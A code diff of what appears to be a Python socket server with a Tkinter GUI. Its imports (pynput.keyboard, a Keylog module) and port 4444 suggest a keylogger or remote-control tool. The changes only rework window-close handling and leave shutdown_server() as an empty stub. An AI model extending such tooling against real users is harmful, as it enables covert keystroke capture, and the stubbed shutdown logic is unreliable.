@@ -16,6 +16,7 @@ import pynput.keyboard
 import Program
 import Keylog
 from tkinter import *
+import signal
 
 PORT = 4444
 img_bytes = b'\x00\x01\x02...'
@@ -52,12 +53,12 @@ class Server:
         finally:
             self.server.close()
 
-    def stop(self):
-        # Quit on ctrl-c
-        print("\nSIGINT received, stopping\n")
-        self.server.close()
-        sys.exit(0)
-
+    # def stop(self, signal, frame):
+    #     # Quit on ctrl-c
+    #     print("\nSIGINT received, stopping\n")
+    #     self.server.close()
+    #     sys.exit(0)
+    
     def handle_client(self, conn, addr):
         self.clients.append(conn)
         try:
@@ -472,12 +473,30 @@ class ServerGUI(tk.Frame):
         self.button1.pack(pady=20)
 
         self.pack()
+        # Bind the window close event to the method
+        self.master.protocol("WM_DELETE_WINDOW", self.on_closing)
 
     def open_server(self):
         self.process_click()
 
     def process_click(self):
         print("PROCESS command sent to the server.")
+        
+    def on_closing(self):
+        # This method is called when the user clicks the "X" button to close the window
+        print("Closing the server...")
+        # Perform your cleanup and shutdown operations here
+        
+        # For example, you could call a method to shut down the server gracefully
+        self.shutdown_server()
+        
+        # Close the Tkinter window
+        self.master.destroy()
+
+    def shutdown_server(self):
+        # Implement your server shutdown logic here
+        print("Shutting down the server...")
+        # For example, you could call your Server's shutdown method
 
 def main():
     server = Server('0.0.0.0')
@@ -486,15 +505,8 @@ def main():
 
     root = tk.Tk()
     server_app = ServerGUI(master=root)
-    #server_app.mainloop()
-    def on_window_close():
-        # Stop the serverS
-        server.stop()
-        # Perform any other necessary cleanup operations here
-        root.destroy()
-    root.protocol("WM_DELETE_WINDOW", on_window_close)
+    #signal.signal(signal.SIGINT, server.stop)
     server_app.mainloop()
-    #server_app.mainloop()
     
 if __name__ == "__main__":
     main()
